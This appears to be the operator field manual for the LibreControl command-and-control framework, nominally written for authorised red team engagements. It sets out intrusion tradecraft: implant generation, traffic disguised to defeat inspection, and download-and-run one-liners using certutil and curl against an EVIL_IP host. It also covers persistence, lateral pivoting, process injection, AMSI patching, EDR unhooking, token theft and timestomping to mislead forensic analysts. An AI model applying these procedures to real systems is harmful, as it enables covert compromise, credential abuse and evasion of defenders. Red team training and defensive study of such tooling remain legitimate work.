# Operator Field Manual: Tactics, Techniques, and Procedures (TTPs)

This manual defines the Standard Operating Procedures (SOP) for utilizing the **LibreControl** framework in authorized Red Team engagements or educational simulations. It bridges the gap between the technical architecture and operational execution.

> [!WARNING]
> Execution of the procedures described herein without explicit, written authorization constitutes a violation of the Computer Fraud and Abuse Act (CFAA) and equivalent international laws. Refer to [`RISK_ASSESSMENT.md`](RISK_ASSESSMENT.md) before proceeding.

## Infrastructure Initialization (Pre-Flight)

Before any agent can be deployed, the C2 grid must be established and healthy.

### Sequence of Operations

1. **Boot Grid**: `docker-compose -f build/docker-compose.yml up -d`
2. **Verify Database**: Ensure `libre_db` is healthy (`docker ps`).
3. **Check Logs**: Tail the logs of the Team Server to ensure keys are generated.
    ```
    docker logs -f libre_core
    # Look for: "[INFO] Cryptographic Subsystem Initialized. Server Public Key: [HASH]"
    ```

### Listener Configuration

Listeners are the "Ears" of the operation. By default, they bind to standard ports.

- **HTTP Listener**: Binds to `:80`. Ensure no other service (like Nginx/Apache) is running on the host OS on this port.
- **DNS Listener**: Binds to `:53/udp`. Requires the host OS to disable `systemd-resolved` or any local caching resolver.

### Advanced Traffic Masquerading (Malleable Profiles)

To defeat Deep Packet Inspection (DPI), Listeners load profiles from `config/profiles.json`. Operators must validate this JSON before deployment.

**Example Profile Structure:**

```
{
    "profile_name": "amazon_cloudfront_mimic",
    "http_get": {
        "uri": ["/api/v2/static/image.png", "/content/assets/style.css"],
        "headers": {
            "Server": "CloudFront",
            "Cache-Control": "max-age=3600"
        },
        "metadata_transform": {
            "location": "cookie",
            "name": "session_id",
            "encoding": "base64url"
        }
    }
}
```

- **Technical Note**: The `metadata_transform` block dictates where the Agent's encrypted ID is hidden. Mismatches between Agent configuration and Listener profile will result in dropped packets (404 Not Found).

## Weaponization (Payload Generation)

The **Factory** service creates the implants. Do not reuse binaries between engagements; generate unique artifacts per campaign to ensure key isolation.

### Build Parameters

When requesting a build via the Console/API, the following parameters are critical:

| Parameter    | Type               | Description                       | Tradecraft Note                                              |
|--------------|--------------------|-----------------------------------|--------------------------------------------------------------|
| **Platform** | `windows`, `linux` | Target Operating System           | -                                                            |
| **Arch**     | `amd64`, `x86`     | CPU Architecture                  | Match the target environment.                                |
| **Protocol** | `HTTP`, `DNS`      | Transport Mechanism               | HTTP is faster; DNS is stealthier.                           |
| **LHost**    | IP/Domain          | The Address the Agent connects to | Use a Redirector IP, never the C2 IP.                        |
| **Jitter**   | `0-50`             | Randomization %                   | High jitter (>20%) is required to defeat heuristic analysis. |

### Artifact Handling

- **Output**: The Factory outputs a raw binary (e.g., `agent.exe`).
- **Signatures**: This binary is **NOT** obfuscated against AV/EDR.
- **Procedure**: In a simulation, you may need to whitelist the specific MD5 hash of the generated agent on the target's security solution to allow execution, acknowledging that "Evasion" is a separate discipline not covered by the auto-generated code.

## Engagement Lifecycle (The Loop)

Once the agent executes on the target, the **OODA Loop** (Observe, Orient, Decide, Act) begins.

### The Beaconing Concept

LibreControl is **asynchronous**. When you issue a command, it does not execute immediately.

1. **Queue**: You submit `shell whoami`. The command sits in the Database.
2. **Check-In**: The Agent wakes up (e.g., 60s later) and asks for work.
3. **Pickup**: The Agent downloads the task.
4. **Execution**: The Agent runs the task locally.
5. **Result**: The Agent posts the result at the _next_ check-in.

#### The Math of Jitter

Operators must calculate the **Maximum Window of Silence** to differentiate between a "Lost Agent" and a "sleeping Agent".

$$T_{sleep} = T_{base} \pm (T_{base} \times \frac{J_{factor}}{100})$$

- **Example**: Sleep 60s with 20% Jitter.
    - **Min Sleep**: $60 - 12 = 48s$
    - **Max Sleep**: $60 + 12 = 72s$
    - **Protocol**: Do not declare an agent "dead" until $3 \times MaxSleep$ (216s) has passed.

### Core Commands (OpCodes)

| Command    | Syntax                  | Purpose                      | OpSec Impact                                                                                   |
|------------|-------------------------|------------------------------|------------------------------------------------------------------------------------------------|
| **Sleep**  | `sleep [sec] [jitter]`  | Changes the beacon interval. | **Low**. Use to speed up interaction (`sleep 5 0`) then slow down (`sleep 600 20`) to go dark. |
| **Shell**  | `shell [cmd]`           | Runs via `cmd.exe /c`.       | **High**. Creates a child process (Process Creation Event ID 4688). Monitored by EDR.          |
| **Exec**   | `exec [binary] [args]`  | Spawns a binary directly.    | **Medium**. Slightly cleaner than shell.                                                       |
| **Upload** | `upload [local] [dest]` | Drops a file to disk.        | **High**. Touching disk creates forensic artifacts ($MFT entries).                             |
| **Exit**   | `exit`                  | Terminates the agent.        | **Safe**. Use this to clean up.                                                                |

## Post-Exploitation Tradecraft

### File System Discipline

- **Working Directory**: The agent maintains a "Current Working Directory" state. Always check `pwd` before uploading files to avoid dropping malware in visible folders like `C:\Users\User\Desktop`.
- **Target**: Prefer hidden directories like `C:\Windows\Temp` or `%APPDATA%`.

### Data Exfiltration

- **Small Files**: Use the standard `download` command.
- **Large Data**: Do not attempt to download GBs of data over a DNS tunnel. It will crash the listener and alert the SOC. Use the HTTP listener for heavy lifting.

### Living off the Land (LotL)

To minimize dropping new binaries (which triggers AV scanning), use tools already present on the OS.

- **CertUtil (Windows)**: Use for downloading tools if `download` op is flagged. `shell certutil.exe -urlcache -split -f "http://EVIL_IP/tool.exe" C:\Windows\Temp\tool.exe`
- **Curl (Linux)**: `shell curl -o /tmp/tool http://EVIL_IP/tool && chmod +x /tmp/tool`

## Lateral Movement & Pivoting

Accessing deep network segments that have no direct internet access.

### SMB Pivoting (The Daisy Chain)

- **Scenario**: Agent A (Compromised Web Server) can talk to Internet. Agent B (Database) has no Internet but can talk to Agent A via SMB (Port 445).
- **Technique**: Agent A binds a Named Pipe. Agent B connects to that Pipe. Agent A wraps Agent B's traffic in its own HTTP packets.
- **Command**: `link [target_ip] [pipe_name]`
- **OpSec**: SMB traffic between servers is common, but named pipe creation is monitored. Use common pipe names like `\pipe\atsvc` or `\pipe\epmapper` to blend in.

## Persistence & Survivability

Ensuring the agent restarts when the user reboots the machine.

> [!NOTE]
> All persistence methods write to disk and modify system configuration. This increases the detection score significantly.

### Registry Run Keys (User Level)

- **Target**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Command**: `persist registry [key_name]`
- **Risk**: Very common location checked by Autoruns. Use only for short-term persistence.

### Service Creation (System Level)

- **Requirement**: Agent must have Elevated Privileges (Admin/System).
- **Command**: `persist service [service_name] [display_name]`
- **Risk**: Creating a service generates Event ID 7045. A vigilant SOC will notice "Google Update Service" pointing to `C:\Windows\Temp\malware.exe`.

## Defense Evasion

Techniques to hide the agent's presence while it is running.

### Process Injection & Migration

Moving the beacon from the initial artifact (e.g., `malware.exe`) into a legitimate, long-running process (e.g., `explorer.exe`).

- **Command**: `inject [pid]`
- **Mechanism**: The agent allocates memory in the remote process, writes its shellcode, and creates a remote thread (`CreateRemoteThread` or `NtCreateThreadEx`) to execute it.
- **Tradecraft**:
    - Migrate early to `explorer.exe` (User) or `spoolsv.exe` (System) to blend in.

> [!NOTE]
> Process Injection is an aggressive action. Modern EDRs hook the kernel callbacks for thread creation. If the target has active EDR, this command may trigger an immediate alert and kill the agent.

### Beacon Object Files (BOF) - Modular Execution

Executing C code directly in the agent's memory space without dropping a DLL to disk.

- **Command**: `inline-execute [path/to/bof.o]`
- **Purpose**: Run advanced post-exploitation tools (like `Mimikatz` style credential dumping or Active Directory reconnaissance) using the COFF loader format.
- **OpSec**: Extremely stealthy as it avoids the `fork & run` pattern of spawning child processes. It executes within the agent's own thread stack.

### AMSI Neutralization (Bypass)

The Antimalware Scan Interface (AMSI) inspects memory buffers for malicious scripts (PowerShell/VBScript).

- **Command**: `patch-amsi`
- **Mechanism**: The agent identifies the `AmsiScanBuffer` function address in `amsi.dll` and patches the initial instructions to always return `AMSI_RESULT_CLEAN`.
- **Risk**: This involves patching read-only memory sections. If EDR is monitoring memory integrity, this will trigger a violation.

### EDR Unhooking

Removing the "spies" that EDR solutions inject into the agent's process.

- **Command**: `unhook`
- **Mechanism**: The agent reads a fresh copy of `ntdll.dll` from disk and overwrites the in-memory text section of the DLL. This removes any `jmp` instructions (trampolines) inserted by the EDR to intercept API calls.
- **Tradecraft**: Run this immediately after `inject` or migration to blind the sensors in the new process.

## Identity Engineering (Credential Access)

Manipulating user contexts without knowing passwords.

### Token Manipulation

Stealing the Access Token of another process to impersonate that user.

- **Command**: `steal-token [pid]`
- **Scenario**: You are `User_A` (Medium Integrity). You see `explorer.exe` running as `Domain_Admin`. You steal that token to gain network authentication privileges.
- **Constraint**: You typically need `SeDebugPrivilege` (High Integrity) to read tokens from other users.
- **Cleanup**: `rev2self` (Revert to Self) to drop the stolen token before sleeping.

## Network Tunneling (SOCKS Proxy)

Turning the Agent into a pivot point for external tools.

### SOCKS5 Architecture

Allows the Operator to run tools like `Nmap`, `Burp Suite`, or `RDP` on their local machine, but have the traffic exit through the Agent's interface on the target network.

- **Command**: `socks [port]` (e.g., `socks 1080`)
- **Setup**:
    1. Operator starts SOCKS server on Team Server: `socks 1080`
    2. Operator configures local `proxychains.conf` to point to Team Server IP.
    3. Operator runs: `proxychains nmap -sT -p 445 192.168.1.10`
- **Constraint**: SOCKS over HTTP/DNS is slow. It adds significant latency. Use `-sT` (TCP Connect) scans, never `-sS` (SYN scans) which require raw sockets the proxy cannot handle.

## Anti-Forensics

Techniques to frustrate post-incident analysis.

### Timestomping ($MFT Manipulation)

When a file is uploaded, the OS assigns it the current timestamp. Forensic analysts look for "fresh" files to find malware.

- **Command**: `timestomp [target_file] [source_file]`
- **Example**: `timestomp C:\Windows\Temp\evil.exe C:\Windows\System32\kernel32.dll`
- **Effect**: Copies the Creation, Modification, and Access (MAC) times from `kernel32.dll` to `evil.exe`, making the malware appear as if it was installed with the OS years ago.

## Emergency Procedures

### Lost Agent Protocol

If an agent stops checking in:

1. **Check Timestamp**: Is `LastSeen` > `SleepInterval * 2`?
2. **Hypothesis**: The agent may have crashed, been killed by EDR, or the host went offline.
3. **Action**: Do not respawn immediately. Wait 24 hours. If it's a "Blue Team" block, re-launching immediately reveals your persistence mechanism.

### The "Burn" (Clean Teardown)

At the end of the engagement:

1. **Task Exit**: Send the `exit` command to all active agents.
2. **Verify**: Wait for the "Goodbye" packet.
3. **Wipe**: `docker-compose down -v`. This destroys the database and keys. **Note**: This is irreversible. Ensure logs are exported if needed for compliance.

## Troubleshooting

- **Symptom**: Agent is running, but no beacon appears in Console.
    - _Cause A_: Network Firewall blocking the port.
    - _Cause B_: Mismatch in public keys (Did you rebuild the server but keep the old agent?).
    - _Cause C_: Jitter is too high, and the agent is just sleeping.
- **Symptom**: "Task Timeout" in logs.
    - _Cause_: The Agent took too long to execute (e.g., a hung process). The queue may need clearing.

## Debugging & Forensics

### Direct Database Inspection

If the UI is unresponsive, Operators may query the state directly via the `database` container.

```
# Enter the DB container
docker exec -it libre_db psql -U libre_admin -d librecontrol

# Query 1: Find tasks stuck in PENDING state
SELECT task_id, command, created_at FROM tasks WHERE status = 'PENDING';

# Query 2: Retrieve raw output for a specific failed task
SELECT output_blob FROM results WHERE task_id = 'uuid-here';
```

### Network Signatures (Blue Team Perspective)

Be aware of what the defender sees.

- **JA3 Hash**: The Go `net/http` client has a distinct TLS handshake fingerprint. Sophisticated defenders can block the Agent based on its JA3 hash, even if the C2 IP changes.
    - _Mitigation_: Use the `uTLS` library in the Agent source code to randomize the ClientHello handshake (requires code modification in `cmd/agent`).
- **Packet Size Consistency**: If every beacon is exactly 1024 bytes (padded), this creates a visible heartbeat on the network graph.